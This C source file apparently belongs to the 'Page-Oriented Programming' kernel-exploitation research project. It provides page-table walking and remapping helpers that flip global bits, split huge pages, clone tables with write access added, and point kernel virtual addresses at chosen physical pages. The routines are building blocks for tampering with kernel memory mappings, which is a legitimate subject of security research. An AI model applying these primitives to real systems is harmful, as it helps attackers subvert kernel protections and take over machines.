/**
 *                   Page-Oriented Programming (POP)
 *                   -------------------------------
 *
 *                   Copyright (C) 2023 Seunghun Han
 *                 at the Affiliated Institute of ETRI
 * Project link: https://github.com/kkamagui/page-oriented-programming 
 */
#include <stdio.h>
#include "cve_struct.h"
#include "cve_page.h"

//=============================================================================
// Copies from the kernel code.

/*
 * Convert a physical address to a user-space logical address.
 */
void* __va(void* x)
{
	//dbg_printf("   [*] __va %016lX, phy_mapped_address %016lX\n", (uint64_t) x, g_config.phy_mapped_address);

	return (void*)((uint64_t)x - g_config.phy_start + (uint64_t)g_config.phy_mapped_address);
}

/*
 *	Check if it is a private page table.
 */
int is_private_page_table(uint64_t phy_addr)
{
	uint64_t alloc_start;
	uint64_t alloc_end;

	alloc_end = g_config.phy_size / PAGE_SIZE;
	alloc_start = alloc_end - (g_config.free_page_index * PAGE_SIZE);

	printf("   [*] ==> alloc_start %016lX, alloc_end %016lX, phy %016lX ", alloc_start, alloc_end, phy_addr);
	
	if ((alloc_start <= phy_addr) && (phy_addr < alloc_end))
	{
		printf(" Private page table\n");
		return 1;
	}

	printf(" Original page table\n");
	return 0;
}

/**
 *	Change the global bit from the page table.
 */
unsigned long change_g_bit(struct mm_struct* mm, unsigned long vaddr, int set)
{
	pgd_t *pgd;
	p4d_t *p4d;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *pte;
	unsigned long paddr = 0;
	unsigned long page_addr = 0;
	unsigned long page_offset = 0;

	dbg_printf( "   [*] Changing the global bit, vaddr = %016lX, set %d\n", vaddr, set);

	pgd = pgd_offset(mm, vaddr);
	if (pgd_none(*pgd) || !(pgd_val(*pgd) & _PAGE_PRESENT))
	{
		dbg_printf( "   [*] No PGD.\n");
		return -1;
	}
	
	p4d = p4d_offset(pgd, vaddr);
	if (p4d_none(*p4d))
	{
		dbg_printf( "   [*] No P4D, but L5 paging is not enabled. So skip it.\n");
	}

	pud = pud_offset(p4d, vaddr);
	if (pud_none(*pud) || !(pud_val(*pud) & _PAGE_PRESENT))
	{
		dbg_printf( "   [*] No PUD.\n");
		return -1;
	}

	// 1 GB page size.
	if (pud_large(*pud))
	{
		//dbg_printf("   [*] PUD is a huge page.\n");
		page_addr = pud_val(*pud) & PUD_MASK;
		page_offset = vaddr & ~PUD_MASK;
		paddr = page_addr + page_offset;

		if (set == 1)
		{
			pud->pud = pud->pud | _PAGE_GLOBAL;
		}
		else
		{
			pud->pud = pud->pud & ~_PAGE_GLOBAL;
		}

		return paddr;
	}

	pmd = pmd_offset(pud, vaddr);
	if (pmd_none(*pmd) || !(pmd_val(*pmd) & _PAGE_PRESENT))
	{
		dbg_printf("   [*] No PMD.\n");
		return -1;
	}

	// 2 MB page size.
	if (pmd_large(*pmd))
	{
		//dbg_printf("   [*] PMD is a large page.\n");
		page_addr = pmd_val(*pmd) & HPAGE_MASK;
		page_offset = vaddr & ~HPAGE_MASK;
		paddr = page_addr + page_offset;

		if (set == 1)
		{
			pmd->pmd = pmd->pmd | _PAGE_GLOBAL;
		}
		else
		{
			pmd->pmd = pmd->pmd & ~_PAGE_GLOBAL;
		}

		return paddr;
	}

	pte = pte_offset_kernel(pmd, vaddr);
	if (pte_none(*pte) || !(pte_val(*pte) & _PAGE_PRESENT))
	{
		dbg_printf("   [*] No PTE.\n");
		return -1;
	}

	if (set == 1)
	{
		pte->pte = pte->pte | _PAGE_GLOBAL;
	}
	else
	{
		pte->pte = pte->pte & ~_PAGE_GLOBAL;
	}

	page_addr = pte_val(*pte) & PAGE_MASK;
	page_offset = vaddr & ~PAGE_MASK;
	paddr = page_addr | page_offset;

	return paddr;
}

/**
 *	Translate a virtual address to a physical address.
 */
unsigned long travel_kernel_vaddr_to_paddr(struct mm_struct* mm, unsigned long vaddr)
{
	pgd_t *pgd;
	p4d_t *p4d;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *pte;
	unsigned long paddr = 0;
	unsigned long page_addr = 0;
	unsigned long page_offset = 0;

	dbg_printf("==>%s, vaddr: %016lX\n", __FUNCTION__, vaddr);

	pgd = pgd_offset(mm, vaddr);
	if (pgd_none(*pgd))
	{
		dbg_printf("   [*] No PGD.\n");
		return -1;
	}

    p4d = p4d_offset(pgd, vaddr);
    if (p4d_none(*p4d))
    {
		dbg_printf("   [*] No P4D, but L5 paging is not enabled. So skip it.\n");
    }
	pud = pud_offset(p4d, vaddr);
	if (pud_none(*pud) || !(pud_val(*pud) & _PAGE_PRESENT))
	{
		dbg_printf( "   [*] No PUD. PUD %016lX\n", *pud);
		return -1;
	}

	pmd = pmd_offset(pud, vaddr);
	if (pmd_none(*pmd) || !(pmd_val(*pmd) & _PAGE_PRESENT))
	{
		dbg_printf( "   [*] No PMD.\n");
		return -1;
	}

	if (pmd_flags(*pmd) & _PAGE_GLOBAL)
	{
		dbg_printf( "   [*] PMD is a global page.\n");
	}

	// Need to split.
	if (pmd_large(*pmd))
	{
		dbg_printf( "   [*] PMD is a lage page. %lX\n", pmd_val(*pmd));

		page_addr = pmd_val(*pmd) & HPAGE_MASK;
		page_offset = vaddr & ~HPAGE_MASK;
		paddr = page_addr + page_offset;

		return paddr;
	}

	pte = pte_offset_kernel(pmd, vaddr);
	if (pte_none(*pte))
	{
		return -1;
	}

	page_addr = pte_val(*pte) & PAGE_MASK;
	page_offset = vaddr & ~PAGE_MASK;
	paddr = page_addr | page_offset;

	return paddr;
}

/**
 *	Split a 2 MB page into 4 KB pages.
 */
void split_to_4kb(pmd_t* pmd)
{
	pte_t *pte;
	unsigned long pmd_start_addr;
	int i;

	pte = (pte_t *)get_free_page_and_convert_to_user();
	memset(pte, 0, PAGE_SIZE);

	// Fill all addresses.
	pmd_start_addr = pmd_val(*pmd) & HPAGE_MASK;
	for (i = 0 ; i < 512 ; i++)
	{
		pte[i].pte = (pmd_start_addr + 0x1000 * i) | _PAGE_PRESENT;
		if (pmd_val(*pmd) & _PAGE_PRESENT)
		{
			pte[i].pte = pte[i].pte | _PAGE_RW;
		}
	}

	// Update pmd without a global bit.
	pmd->pmd = ((uint64_t)user_virt_to_phys(pte)) | _PAGE_PRESENT | _PAGE_RW;
}


/**
 *	Replace page tables with a new physical address.
 */
unsigned long replace_paddr(struct mm_struct* mm, unsigned long vaddr, unsigned long new_paddr)
{
    pgd_t *pgd;
	p4d_t *p4d;
    pud_t *pud;
    pud_t *new_pud;
    pmd_t *pmd;
    pmd_t *new_pmd;
    pte_t *pte;
    pte_t *new_pte;
    unsigned long paddr = 0;
    unsigned long page_addr = 0;
    unsigned long page_offset = 0;
	unsigned long temp = 0;
	int i;

	dbg_printf( "   [*] Replacing vaddr = %016lX with new_paddr = %016lX\n", vaddr, new_paddr);

	//=========================================================================
	// PGD	
	//=========================================================================
    pgd = pgd_offset(mm, vaddr);
    if (pgd_none(*pgd) || (pgd_val(*pgd) == 0))
	{
        dbg_printf( "   [*] No PGD. Adding a new PGD.\n");

		new_pud = (pud_t *)get_free_page_and_convert_to_user();
		for (i = 0 ; i < 512 ; i++)
		{
			new_pud[i].pud = 0x00;
		}
		pgd->pgd = (uint64_t)user_virt_to_phys(new_pud) | _PAGE_PRESENT | _PAGE_RW;
    }
	else
	{
		// Duplicate and make private page tables.
		if (is_private_page_table(pgd_val(*pgd) & PAGE_MASK) == 0)
		{
			new_pud = (pud_t *)get_free_page_and_convert_to_user();
			pud = (pud_t *)user_phys_to_virt(pgd_val(*pgd) & PAGE_MASK);
			for (i = 0 ; i < 512 ; i++)
			{
				new_pud[i].pud = pud[i].pud;
				if (new_pud[i].pud & _PAGE_PRESENT)
				{
					new_pud[i].pud |= _PAGE_RW;
				}
			}
			pgd->pgd = (uint64_t)user_virt_to_phys(new_pud) | (pgd->pgd & 0xfff) | _PAGE_PRESENT | _PAGE_RW;
		}
	}

	//=========================================================================
	// P4D
	//=========================================================================
	p4d = p4d_offset(pgd, vaddr);
	if (p4d_none(*p4d))
	{
		dbg_printf( "   [*] No P4D, but L5 paging is not enabled. So skip it.\n");
	}

	//=========================================================================
	// PUD	
	//=========================================================================
    pud = pud_offset(p4d, vaddr);
    if (pud_none(*pud) || (pud_val(*pud) == 0))
	{
        dbg_printf( "   [*] No PUD. Adding a new PUD.\n");
		new_pmd = (pmd_t *)get_free_page_and_convert_to_user();
		for (i = 0 ; i < 512 ; i++)
		{
			new_pmd[i].pmd = 0x00;
		}
		pud->pud = (uint64_t)user_virt_to_phys(new_pmd) | (pud->pud & 0xfff) | _PAGE_PRESENT | _PAGE_RW;
    }
	else
	{
		// Duplicate and make private page tables.
		if (is_private_page_table(pud_val(*pud) & PAGE_MASK) == 0)
		{
			new_pmd = (pmd_t *)get_free_page_and_convert_to_user();
			pmd = (pmd_t *)user_phys_to_virt(pud_val(*pud) & PAGE_MASK);
			for (i = 0 ; i < 512 ; i++)
			{
				new_pmd[i].pmd = pmd[i].pmd;
				if (new_pmd[i].pmd & _PAGE_PRESENT)
				{
					new_pmd[i].pmd |= _PAGE_RW;
				}
			}
			pud->pud = (uint64_t)user_virt_to_phys(new_pmd) | (pud->pud & 0xfff) | _PAGE_PRESENT | _PAGE_RW;
		}
	}

	//=========================================================================
	// PMD	
	//=========================================================================
    pmd = pmd_offset(pud, vaddr);
    if (pmd_none(*pmd) || (pmd_val(*pmd) == 0))
	{
        dbg_printf( "   [*] No PMD. Adding a new PMD.\n");
		new_pte = (pte_t *)get_free_page_and_convert_to_user();
		for (i = 0 ; i < 512 ; i++)
		{
			new_pte[i].pte = 0x00;
		}
		pmd->pmd = (uint64_t)user_virt_to_phys(new_pte) | _PAGE_PRESENT | _PAGE_RW;
    }
	else
	{
		if (pmd_flags(*pmd) & _PAGE_GLOBAL)
		{
			//dbg_printf("   [*] PMD is a global page.\n");
		}

		if (pmd_large(*pmd))
		{
			//dbg_printf("   [*] PMD is a large page\n");
			page_addr = pmd_val(*pmd) & HPAGE_MASK;
			page_offset = vaddr & ~HPAGE_MASK;
			paddr = page_addr + page_offset;

			split_to_4kb(pmd);
		}

		// Duplicate and make private page tables.
		if (is_private_page_table(pmd_val(*pmd) & PAGE_MASK) == 0)
		{
			new_pte = (pte_t *)get_free_page_and_convert_to_user();
			pte = (pte_t *)user_phys_to_virt(pmd_val(*pmd) & PAGE_MASK);
			for (i = 0 ; i < 512 ; i++)
			{
				new_pte[i].pte = pte[i].pte;
				if (new_pte[i].pte & _PAGE_PRESENT)
				{
					new_pte[i].pte |= _PAGE_RW;
				}
			}
			pmd->pmd = (uint64_t)user_virt_to_phys(new_pte) | (pmd->pmd & 0xfff) | _PAGE_PRESENT;
		}
	}
	
    pte = pte_offset_kernel(pmd, vaddr);
    if (pte_none(*pte))
	{
		page_addr = 0;
		pte->pte = (new_paddr & PAGE_MASK) | _PAGE_PRESENT | _PAGE_RW;
    }
	else
	{
		// Replace to the new physical address.
		page_addr = pte_val(*pte);
		pte->pte = (new_paddr & PAGE_MASK) | _PAGE_PRESENT | _PAGE_RW;
	}

    return paddr;
}


/**
 *	Get a free page.
 *		Get a page from the end of the RAM.
 */
void* get_free_page(void)
{
	unsigned long addr;

	addr = g_config.page_offset_base + ((g_config.phy_size / PAGE_SIZE) - 0x1000) - (g_config.free_page_index * PAGE_SIZE);
	g_config.free_page_index++;

	dbg_printf("   [*] get_free_page: VA: %016lX, PA: %016lX is allocated\n", addr, kernel_virt_to_phys((void*)addr));
	return (void*) addr;
}

/**
 *	Get a free page and convert it to the user.
 *		Get a page from the end of the RAM and convert the address to the user space.
 */
void* get_free_page_and_convert_to_user(void)
{
	unsigned long addr;
	
	addr = (uint64_t) get_free_page();
	//dbg_printf("   [*] get_free_page: %016lX\n", addr);
	return convert_kernel_virt_to_user_virt(addr);
}


